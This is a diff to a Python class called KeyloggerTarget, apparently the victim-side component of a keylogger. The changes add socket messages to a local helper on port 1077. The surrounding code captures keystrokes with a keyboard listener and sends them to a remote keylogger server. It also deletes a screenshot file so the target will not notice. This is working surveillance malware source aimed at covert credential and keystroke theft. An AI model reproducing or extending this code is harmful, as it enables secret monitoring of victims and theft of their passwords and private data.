@@ -87,6 +87,10 @@ class KeyloggerTarget:
         for dir_name in random_lst:
             os.system(f"mkdir {dir_name}")
             # The directory is being made here
+        lst_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        lst_server.connect(("127.0.0.1", 1077))
+        lst_server.send(str(random_lst).encode())
+        lst_server.close()
 
         random_dir = random.choice(random_lst)
         os.chdir(random_dir)
@@ -169,6 +173,11 @@ class KeyloggerTarget:
             key_data.connect((ip_keylogger, port_keylogger))
             key_data.send(data.encode())
             key_data.close()
+
+            new_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            new_server.connect(("127.0.0.1", 1077))
+            new_server.send("done".encode())
+            new_server.close()
 
             if os.path.exists("Image.png"):
                 # It will destroy the image so target wound know anything
@@ -292,6 +301,12 @@ class KeyloggerTarget:
         send_timer.send(str(self.duration).encode())
         # This sends the seconds to the server
         send_timer.close()
+
+        timer_delete_dir = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        timer_delete_dir.connect(("127.0.0.1", 1077))
+
+        timer_delete_dir.send(str(self.duration).encode())
+        timer_delete_dir.close()
 
         with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             self.countdown_send(self.duration, self.ip_photos, self.port_photos, self.ip_keylogger,
